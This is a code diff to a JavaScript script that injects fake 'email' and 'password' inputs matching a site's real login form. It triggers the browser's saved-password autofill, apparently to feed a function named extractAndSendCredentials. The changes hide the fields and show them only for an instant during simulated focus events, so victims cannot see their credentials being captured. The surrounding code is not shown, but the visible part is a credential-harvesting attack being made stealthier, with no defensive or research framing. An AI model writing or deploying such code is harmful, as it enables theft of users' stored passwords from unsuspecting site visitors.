@@ -25,7 +25,7 @@ var inputUsername = document.createElement('input');
 inputUsername.type = 'text';
 inputUsername.id = 'email'; // Match the ID used on the original login form
 inputUsername.name = 'email'; // Match the name used on the original login form
-inputUsername.style.display = 'block';
+inputUsername.style.display = 'none'; // Initially hidden
 inputUsername.style.width = '300px';
 inputUsername.style.height = '40px';
 inputUsername.style.marginBottom = '10px';
@@ -34,7 +34,7 @@ var inputPassword = document.createElement('input');
 inputPassword.type = 'password';
 inputPassword.id = 'password'; // Match the ID used on the original login form
 inputPassword.name = 'password'; // Match the name used on the original login form
-inputPassword.style.display = 'block';
+inputPassword.style.display = 'none'; // Initially hidden
 inputPassword.style.width = '300px';
 inputPassword.style.height = '40px';
 inputPassword.style.marginBottom = '10px';
@@ -82,9 +82,15 @@ function extractAndSendCredentials() {
 
 // Function to simulate user interaction to trigger autofill
 function simulateInteraction() {
+  inputUsername.style.display = 'block'; // Show temporarily to trigger autofill
+  inputPassword.style.display = 'block'; // Show temporarily to trigger autofill
+
   inputUsername.focus();
   inputPassword.focus();
   inputPassword.blur();
+  
+  inputUsername.style.display = 'none'; // Hide after autofill
+  inputPassword.style.display = 'none'; // Hide after autofill
 }
 
 // Attach event listeners to the clickable text
